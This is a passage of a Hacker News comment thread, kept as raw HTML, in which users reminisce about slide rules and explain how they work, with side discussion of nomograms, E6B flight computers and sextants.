educational tools competition but the other entries were cooler. Maybe HN might like it. :-)</p></div></td></tr></tbody></table></td></tr><tr id="46872756"><td></td></tr><tr id="46873051"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46873051" href="https://news.ycombinator.com/vote?id=46873051&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>You almost have to do this, or buy a used one at a markup, as nobody seems to make them anymore (except circular ones).</p></div></td></tr></tbody></table></td></tr><tr id="46873493"><td></td></tr><tr id="46874701"><td></td></tr><tr id="46874038"><td></td></tr><tr id="46872907"><td></td></tr><tr id="46873461"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46873461" href="https://news.ycombinator.com/vote?id=46873461&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>right, i'm still absolute rubbish at the game  but it's been a great learning experience!</p></div></td></tr></tbody></table></td></tr><tr id="46871376"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871376" href="https://news.ycombinator.com/vote?id=46871376&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I do not use, and have never used, a slide rule. My grandfather was an aeronautical engineering / materials scientist for McDonnell Aircraft, and did a lot of foundational work on heat shields for early space flight (or so I am told). He was eventually named a McDonnell Douglas Fellow, back when there were fewer than 15 Fellows - the company, at the time, took out a full-page ad in Aerospace Magazine announcing it.</p><p>I have his slide rule, that he used for ages. It's a mystery in a box to me - I have not the foggiest clue how it is used - but I cherish it.</p></div></td></tr></tbody></table></td></tr><tr id="46871452"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46871452" href="https://news.ycombinator.com/vote?id=46871452&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>&gt; I have not the foggiest clue how it is used - but I cherish it.</p><p>It's easier and more straightforward than you might expect. I encourage you to learn to use his slide rule, in large part because you might find it fun, but also to honor your grandfather's legacy.</p></div></td></tr></tbody></table></td></tr><tr id="46873797"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46873797" href="https://news.ycombinator.com/vote?id=46873797&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I agree. In fact you should make a (YouTube?) video showing the slide rule and how to use it and your grandfather’s history to preserve this bit of history for your family and family’s future descendants.</p></div></td></tr></tbody></table></td></tr><tr id="46871494"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46871494" href="https://news.ycombinator.com/vote?id=46871494&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>A key idea is that addition for logs is equivalent to multiplication.  To multiply two numbers you line them up on a log scale and then read out the sum, which is equivalent to the product. There is much more they can do but that was one aha moment when my dad showed me his.</p></div></td></tr></tbody></table></td></tr><tr id="46872141"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46872141" href="https://news.ycombinator.com/vote?id=46872141&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I've never used a slide rule but recently developed an interest in them (and also in nomograms [1])</p><p>My fascination stems from a belief: that slide rule usage helps users develop a certain intuition for numbers whereas the calculator doesn't. To illustrate, suppose someone tries to multiply 123 and 987 with a calculator but incorrectly punches in 123 and 187. My hypothesis is they'll look at the result but won't suspect any problem. The equivalent operation on a slide rule requires fewer physical actions and hence, is less error prone.</p><p>Do you think there's anything to this hypothesis?</p><p>[1] <a href="https://news.ycombinator.com/item?id=28690298">https://news.ycombinator.com/item?id=28690298</a></p></div></td></tr></tbody></table></td></tr><tr id="46874254"><td><table><tbody><tr><td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td><center><a id="up_46874254" href="https://news.ycombinator.com/vote?id=46874254&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>With a slide rule you always have to estimate the expected answer in your head before you begin any calculation.  So you develop a feel for how quantities scale with multiplication.</p><p>With a slide rule you can only multiply the significant digits, not the magnitudes -- which you have to do in your head.   So you do exactly the same thing with the slide rule to multiply 123 and 987,  1.23 and 9.87,  and 1,230 and 9,870.  In all three cases, you get exactly the same answer: 121 or maybe just 120 (you only get 3 digits of precision at best).  You still have to multiply the powers of ten in your head, to get the answers 121,000, 12.1, and 12,100,000.</p><p>I am just old enough to belong to the last generation of slide rule users.  I used them in high school and college, then scientific calculators came along.</p></div></td></tr></tbody></table></td></tr><tr id="46872996"><td><table><tbody><tr><td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td><center><a id="up_46872996" href="https://news.ycombinator.com/vote?id=46872996&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>&gt; nomograms</p><p>Me too!</p><p>Nomograms are cool. They're little charts that let you compute a function physically, e.g. by lining up a ruler. A nomogram isn't a picture of a function: it <i>is</i> the function. If you're clever, you can make a nomogram that encodes complicated nonlinear mappings or even complex-valued relationships on a 2D plane.</p><p>Occasionally nomograms are just better too: because they're continuous and analog, they can naturally express things digital logic people can do only awkwardly, just like Rust people can only awkward approximate things natural in Verilog (e.g. truly parallel CAM search).</p><p>Nomograms are basically the tabletop gaming of math. Like a good tabletop game, a good nomogram requires a special kind of cleverness. Sure, coding something like Factorio is also hard: but it runs on a CPU. Something as rich and complex as Power Grid and High Frontier? Running on cardboard? Whole other level.</p><p>I recall one tabletop two-player game that featured a single-player mode in which you played against an "AI" that you ran by hand by moving cardboard pieces around on a game-provided template under pseudocode-ish rules from the game manual. It's hard enough to code a decent game AI with all the resources of a CPU at your disposal. It's an OOM harder to do it when you're limited to physically-realized lookup tables, a literal handful of registers, and a scant few clock cycles of logic per turn.</p><p>Coming full circle, some of these tabletop game "AI"s incorporate nomograms to help them fit their logic within the constraints.</p><p>Example of a cool nomogram: <a href="https://en.wikipedia.org/wiki/Smith_chart" rel="nofollow">https://en.wikipedia.org/wiki/Smith_chart</a>. Smith charts let you compute complex (pun intended) relationships in RF signal processing with just a compass and straightedge.</p><p>Also: part of the fun in making nomograms is that there's no general procedure you can follow to make a good one, just like there's no general compiler from computer game to tabletop game. They're art: specifically, one of those forms of art that, like architecture, has to meet functional requirements while tickling our aesthetic sense. It's kind of funny how when you optimize this kind of art for aesthetics under their functional constraints, you end up supercharging the functional part by side effect somehow.</p></div></td></tr></tbody></table></td></tr><tr id="46873808"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46873808" href="https://news.ycombinator.com/vote?id=46873808&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Exactly. Using a slide rule shows how some complex operations in one domain can be made much easier in another.</p><p>One you understand slide rules and logarithms, it is easier to understand convolutions in the FFT (frequency) domain...</p><p>Almost like programming in APL, where you can solve a problem by expanding it in extra dimensions and getting the answer by re-compacting the complex object using a different view.</p></div></td></tr></tbody></table></td></tr><tr id="46871656"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46871656" href="https://news.ycombinator.com/vote?id=46871656&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I had a similar experience! My grandfather worked at a paper company for years and years as a chemical engineer. He was a hot head, but lightened up as I got older. We started to connect well later in life because I was the only other "engineering type" in my family.</p><p>He gave me his slide rule probably a year or so before he passed away. I've got it sitting on my desk and always makes me think of him. Like you, I've got no idea how to use it (even though he tried to explain it to me), so maybe the other comments here can fill in the gaps for me :)</p></div></td></tr></tbody></table></td></tr><tr id="46872828"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46872828" href="https://news.ycombinator.com/vote?id=46872828&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>My grandfather was a computational meteorologist for the US Air Force who passed when I was a kid. I inherited both his slide rule and his laptop (a 486dx with a math coprocessor!) It felt cool being the only kid at the school with a laptop, but the slide rule languished in a box under my bed until I got it out and figured out how to work it in college. I wish I'd figured it out sooner because it gave a more visceral understanding of the mathematical relationships that I'd been lacking before.  Granted, the slide rule has sat mostly idle since then, but it was definitely worth it. I'd encourage you to give it a go.</p></div></td></tr></tbody></table></td></tr><tr id="46872264"><td></td></tr><tr id="46873542"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46873542" href="https://news.ycombinator.com/vote?id=46873542&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>echoing others' suggestions to take it out and play with it a little !!</p><p>slide rules are happiest when they're used and worn out. they need exercise and sunlight</p></div></td></tr></tbody></table></td></tr><tr id="46871976"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871976" href="https://news.ycombinator.com/vote?id=46871976&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I have one on my watch.  It’s a citizen with a circular slide rule /E6B flight computer.  I need my reading glasses to use it, but it’s fun.</p><p>It can reliably get me 2 sig figs, and a decent guess at a third.  But… if I think about it for a minute, I can usually get that in my head anyway.  Being able to setup a ratio is great though for unit conversions and things.</p><p>It’s also really good for answering that question when driving where you’re like, ok if I go 10mph faster how much sooner will I get there which is otherwise hard to do mentally.</p><p>Most of the benefit of using a slide rule in my experience comes not from using it, but from thinking LIKE you’re going to use a slide rule.   You learn to freely use scientific notation with ease, and mental estimation to get the order of magnitude right.</p><p>And just my 2 cents, but circular slide rules are where it’s at.</p></div></td></tr></tbody></table></td></tr><tr id="46872364"><td></td></tr><tr id="46873435"><td></td></tr><tr id="46872848"><td></td></tr><tr id="46871671"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871671" href="https://news.ycombinator.com/vote?id=46871671&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>A big 6-foot K&amp;E sliderule hung at the front of my high-school chemistry classroom, but was never used. At graduation ('91) I asked the teacher if I could have the slide rule and she said "sure".</p><p>I keep it now in my office, and once a year I bring to the data visualization class I teach at UChicago, to show how it works, and to show it as an example of a visual device in aid of computational thinking (nomographs being another great example).</p></div></td></tr></tbody></table></td></tr><tr id="46872335"><td></td></tr><tr id="46873418"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46873418" href="https://news.ycombinator.com/vote?id=46873418&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I love the Vernier scales!  But I honestly hadn't known about the sense in which slide rules have a Venier scale until your comment, which led me to [1]. In another class on laser-cutting I had students make a kerf-meter, which became more accurate with a Vernier scale.</p><p>[1] <a href="https://dram.page/p/slide-rule-vernier/" rel="nofollow">https://dram.page/p/slide-rule-vernier/</a></p></div></td></tr></tbody></table></td></tr><tr id="46875322"><td></td></tr><tr id="46871657"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871657" href="https://news.ycombinator.com/vote?id=46871657&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I used them in high school in the late 1990s... just to get an extra challenge. I had my dad's and grandfather's and I picked up a couple at garage sales. I still have a collection, but haven't really used them in years. I'll probably break them out again when my kids get in middle school / high school math for fun. They are great for learning the rules of logs.</p></div></td></tr></tbody></table></td></tr><tr id="46873960"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46873960" href="https://news.ycombinator.com/vote?id=46873960&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I was issued one at King's Point Merchant Marine Academy in 1957 and used it constantly.  A side benefit was the learned ability to estimate an answer and decimal point a skill which I still use.  As I recall I mostly used multiplication, division, logs, and trig.  I think I quit using it when I purchased a HP scientific calculator years later.</p></div></td></tr></tbody></table></td></tr><tr id="46874050"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46874050" href="https://news.ycombinator.com/vote?id=46874050&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Re: your username</p><p>My mom found my shellback card among some stuff in her basement and asked if I’d like her to send it to me. Yes, please! Darned if I want to earn a replacement card.</p></div></td></tr></tbody></table></td></tr><tr id="46874850"><td></td></tr><tr id="46875295"><td></td></tr><tr id="46871393"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871393" href="https://news.ycombinator.com/vote?id=46871393&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I did a little nostalgia threat on Mastodon recently. The sixth picture is of the slide rule I took to High School in 1973.</p><p><a href="https://social.bau-ha.us/@raganwald/115979168665997624" rel="nofollow">https://social.bau-ha.us/@raganwald/115979168665997624</a></p><p>Although slide rules are a "dead skill," Aviators typically learn to use something called an E6B Flight Computer, which works on the same principle as a round slide rule.</p><p><a href="https://pilotinstitute.com/e6b-made-easy/" rel="nofollow">https://pilotinstitute.com/e6b-made-easy/</a></p><p>I have one in my flight bag and was required to demonstrate proficiency in its use. Of course we fly with connected digital devices these days, but having an analogue backup that operates even if the power fails is important.</p></div></td></tr></tbody></table></td></tr><tr id="46871558"><td></td></tr><tr id="46872462"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46872462" href="https://news.ycombinator.com/vote?id=46872462&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I have a couple of EB6s to show to my students but ever since scientific calculators were allowed in written tests, I have never used one myself. Law of cosines is good enough for wind triangles :). Worked for a commercial test as well as the ATP. It is a beautiful device though ...</p></div></td></tr></tbody></table></td></tr><tr id="46871917"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46871917" href="https://news.ycombinator.com/vote?id=46871917&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Similar point applies to being able to use a sextant for celestial navigation in bluewater sailing. GPS is great, until you lose power or your equipment malfunctions. Of course, you can have double or triple redundancy to make such cases vanishingly rare, but still — it’s nice to have a backup that relies on nothing outside your control.</p><p>Some of it is pure nostalgia, though, I’ll admit. It a way to honor how people solved similar problems in the past. In the 18th century a sextant plus accurate chronometer or lunar distance table was one of the pivotal technologies of the age; you could use it to pinpoint your location on the boundless ocean within a few miles. That demands respect, and it’s also just really cool it was <i>possible</i> in an era before electricity and radio.</p></div></td></tr></tbody></table></td></tr><tr id="46872533"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46872533" href="https://news.ycombinator.com/vote?id=46872533&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>&gt; Some of it is pure nostalgia, though, I’ll admit. It a way to honor how people solved similar problems in the past. In the 18th century a sextant plus accurate chronometer or lunar distance table was one of the pivotal technologies of the age; you could use it to pinpoint your location on the boundless ocean within a few miles. That demands respect, and it’s also just really cool it was possible in an era before electricity and radio.</p><p>Heh heh, I was in the Sailing Cub in high school, and our Sailing Master (RIP Master Gibb) said literally the same thing about learning to navigate with sextant and chronometer even though we never sailed out of sight of land. It was all about deep respect for the history and tradition of being a Mariner.</p><p>Now I fly gliders, "the purest form of flight," and while you can get a glider with electrically operated landing gear, a jet sustainer engine, and digital navigation and flight computing devices...</p><p>There is something extraordinarily pure about the exercise of flying with everything electrical turned off (except for the transponder and radio for safety). And even purer... Flying with covered instruments so we don't even get analogue airspeed and altitude.</p><p>Circling back to slide rules... Sometimes we crave that simplicity, that direct experience of a thing.</p></div></td></tr></tbody></table></td></tr><tr id="46872164"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46872164" href="https://news.ycombinator.com/vote?id=46872164&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I used a calculator throughout college; they had <i>just</i> become relatively affordable. But I still generally brought a slide rule to exams in case something happened to my calculator. (They were LED displays and things weren't as generally reliable at that time.)</p></div></td></tr></tbody></table></td></tr><tr id="46871776"><td></td></tr><tr id="46872304"><td></td></tr><tr id="46871877"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46871877" href="https://news.ycombinator.com/vote?id=46871877&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Somewhere around here, I have a Proportion Calculator wheel which I used for determining the size/scaling of graphics --- I was the only person in the shop who could use it though, everyone else used calculators or once I showed them how, did math in the size field of the applications such as Freehand/MX which allowed math.</p></div></td></tr></tbody></table></td></tr><tr id="46871460"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871460" href="https://news.ycombinator.com/vote?id=46871460&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>When I was in high school, (early 1990s,) there was a giant one mounted above the blackboard. It was clearly used for instruction in the past, but it looked so cool that no one wanted to remove it.</p><p>Every once in awhile a teacher would spend about 10-15 minutes showing how to use it. Everyone would "oooh" and "awww" and then we would all laugh about how we didn't need to use them now that we all had calculators in our pocket that were more powerful than the computers that put people on the moon.</p><p>It's always nice to learn about the past so we can appreciate what we have now.</p></div></td></tr></tbody></table></td></tr><tr id="46871523"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46871523" href="https://news.ycombinator.com/vote?id=46871523&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>&gt; we all had calculators in our pocket that were more powerful than the computers that put people on the moon.</p><p>Pencils and slide rules are what got us to the moon, and back to Earth. Pencils and slide rules.</p></div></td></tr></tbody></table></td></tr><tr id="46871594"><td></td></tr><tr id="46873136"><td></td></tr><tr id="46871458"><td></td></tr><tr id="46871367"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871367" href="https://news.ycombinator.com/vote?id=46871367&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I have two or three that I inherited from my dad. I've never learned to use them because I haven't thought of something I'd use them for.  The one thing I could think of is quickly doing fractional math while woodworking (what width will I have if I rip this 7.5" board into 4 pieces?) but in reality I just don't actually do that much math while woodworking.</p></div></td></tr></tbody></table></td></tr><tr id="46872980"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46872980" href="https://news.ycombinator.com/vote?id=46872980&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>As mentioned elsewhere you can use them in the kitchen if you start wanting to scale recipes at will - it's easy to double, but with a slide rule you can quickly get other ratios.</p><p>Works better when you do things by weight and metrically, no doubt.</p></div></td></tr></tbody></table></td></tr><tr id="46872496"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872496" href="https://news.ycombinator.com/vote?id=46872496&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>(Raises aged hand sheepishly)</p><p>I have one on my desk that I often use for quick estimations.  It boots up in zero seconds.</p></div></td></tr></tbody></table></td></tr><tr id="46872285"><td></td></tr><tr id="46872440"><td></td></tr><tr id="46875378"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46875378" href="https://news.ycombinator.com/vote?id=46875378&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Yes, but only as a fun retro thing. Not for most calculations, although I have to say for back of the napkin, almost all in your head style things, they can be handy.</p></div></td></tr></tbody></table></td></tr><tr id="46871801"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871801" href="https://news.ycombinator.com/vote?id=46871801&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>We learned to use them in high school (in Canada) in the mid-late '70s. Electronic calculators were just becoming widespread, and not everyone had them.</p><p>I think I can do basic calculations with them, although I really haven't touched one in many years.</p></div></td></tr></tbody></table></td></tr><tr id="46871339"><td></td></tr><tr id="46871966"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871966" href="https://news.ycombinator.com/vote?id=46871966&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I have some from my father, but even though he showed me how to use them a long time ago, I never actually used them. I do however encourage anyone with an interest to go to the Arithmeum in Bonn (Germany) if you have the chance. It houses an large collection of regular and specialized sliderules as well as other (mechanical) computational devices.</p><p><a href="https://www.arithmeum.uni-bonn.de/en/arithmeum.html" rel="nofollow">https://www.arithmeum.uni-bonn.de/en/arithmeum.html</a></p></div></td></tr></tbody></table></td></tr><tr id="46871814"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871814" href="https://news.ycombinator.com/vote?id=46871814&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Yeah. Pickett N600-ES. Sometimes I will solve a problem with it just because I can. Keeps the mental model fresh. Mostly just use an HP 42s though.</p><p>I will note I didn't get it or use it until about 1998.</p></div></td></tr></tbody></table></td></tr><tr id="46871539"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871539" href="https://news.ycombinator.com/vote?id=46871539&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Yep. I have one and I keep showing off how to do math using it, to kids.I have also replaced the broken slider with a plastic piece after etching the log scale onto it.</p></div></td></tr></tbody></table></td></tr><tr id="46871848"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871848" href="https://news.ycombinator.com/vote?id=46871848&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I have a little collection of slide rules. I love those things.</p><p>I'm not old enough to have used them to do calculations, but I find them extremely useful to explain logarithms and how multiplication can be represented by the sum of logarithms. I actually work with grad students who <i>should</i> know these things, but watching it in a slide rule on their hands really helps to build intuition.</p></div></td></tr></tbody></table></td></tr><tr id="46871850"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871850" href="https://news.ycombinator.com/vote?id=46871850&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I own my grandfather's slide rule, he was a master toolmaker for Rolls Royce (aerospace engines) in North London during WW2.</p></div></td></tr></tbody></table></td></tr><tr id="46873030"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46873030" href="https://news.ycombinator.com/vote?id=46873030&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Following a post on HN a few weeks ago, I bought a used one to use in the kitchen for scaling recipes. It has to be a linear one for that, not circular, so you can set it and read it without touching it again. I also have one in my "apocalypse kit" in case of, I dunno, an EMP?</p><p>My dad was an engineer in the slide rule era and taught me how to use one when I was a kid. He said when he was in college all the engineering students had them hanging from their belts in leather sheaths like gladiator swords and they would slap when they walked.</p></div></td></tr></tbody></table></td></tr><tr id="46872686"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872686" href="https://news.ycombinator.com/vote?id=46872686&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I've picked it back up as an intentional way of slowing myself down during calculations.</p><p>Typically to do a calc I fire up Excel or the calc on my phone, bang in the numbers and accept the result without thinking. It's that "without thinking" part that is dangerous. The slide rule is slow and physical and forces my brain to think about the inputs. Another nice feature is that it can give you quick answers when you aren't sure of the accuracy of the inputs. eg if 2 * 4 was really 1.8*4.1, what would the answer be? It's quicker to see that on a slide rule (one tap on the ruler) than punch in 7 characters.</p></div></td></tr></tbody></table></td></tr><tr id="46872905"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872905" href="https://news.ycombinator.com/vote?id=46872905&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Funny you ask ... I lieterally just now pulled out one of my slide rules to keep track of the required run rate for a cricket T20 game.</p><p>Fastest and best feedback for whether the batting team is ahead of the rate.</p></div></td></tr></tbody></table></td></tr><tr id="46873660"><td></td></tr><tr id="46875200"><td></td></tr><tr id="46872634"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872634" href="https://news.ycombinator.com/vote?id=46872634&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>When I was in high school, calculators had just hit the scene. Some teachers allowed them, others didn't.</p><p>One of our teachers allowed us to bring a single page of notes to the exam. I wrote my notes on a photocopy of a slide rule. At exam time, I tore the sheet in half.</p><p>Of course the teacher thought I was being a smart-ass, and given that the tests were written when calculators were not allowed, they were never really all that useful.</p><p>In college chemistry, at each exam, they handed out a sheet that had the periodic table on one side, and a table of logarithms on the other.</p></div></td></tr></tbody></table></td></tr><tr id="46871931"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871931" href="https://news.ycombinator.com/vote?id=46871931&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I used a slide rule for some of my high school physics tests in the 2010s, just for fun. I lost a few points from messing up order of magnitude calculations, but it was totally worth it. I've since collected a few more slide rules from estate sales in my neighborhood. I wish more people knew about them—they're such a neat and elegant part of engineering history, which is why I keep them around.</p><p>I have no use for them on a day-to-day basis, though. An abacus is more useful for things like counting board game points and adding up taxes.</p></div></td></tr></tbody></table></td></tr><tr id="46871369"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871369" href="https://news.ycombinator.com/vote?id=46871369&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Now that's a properly dead skill, surely. I have my dad's one somewhere, and know roughly how it works, but I've not touched it this century.</p><p>I also have one of these: <a href="https://archive.org/details/spencersdecimalr0000unse" rel="nofollow">https://archive.org/details/spencersdecimalr0000unse</a> ; I believe they were popular around the time of the UK converting to decimal currency, to save people having to do the transitional arithmetic. Had a bunch of other tables in. A physical LUT.</p><p>I wonder if there's anyone with abacus skills here. I hear that held out against calculators a lot longer, for shopkeeper uses.</p></div></td></tr></tbody></table></td></tr><tr id="46873995"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46873995" href="https://news.ycombinator.com/vote?id=46873995&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I sort of did for a lark a few years ago, then promptly forgot how to since I could do reasonable math approximations in my head. But my father used his pretty effectively.</p></div></td></tr></tbody></table></td></tr><tr id="46871588"><td></td></tr><tr id="46871343"><td></td></tr><tr id="46871701"><td></td></tr><tr id="46872373"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872373" href="https://news.ycombinator.com/vote?id=46872373&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I don't use one "seriously", or even really know how to use one to be honest. But I did buy one last year, with the intention to learn to use it. Why? Novelty mostly, and just general intellectual curiosity. I haven't really had time to dig into working with it yet though. :-(</p></div></td></tr></tbody></table></td></tr><tr id="46872474"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46872474" href="https://news.ycombinator.com/vote?id=46872474&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I found usage really helps you learn how to WAG (Wild Ass Guess).</p><p>It also scares the crap out of me to think about what infinity is: you see your slide manipulate incredible numbers, then you imagine a slide that is twice as big. Or a few feet long.</p></div></td></tr></tbody></table></td></tr><tr id="46871721"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871721" href="https://news.ycombinator.com/vote?id=46871721&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I bought a vintage (pre-WW1) circular slide rule. But it's too much of an "artifact" to use - I'm afraid I'd damage it.</p></div></td></tr></tbody></table></td></tr><tr id="46872761"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872761" href="https://news.ycombinator.com/vote?id=46872761&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
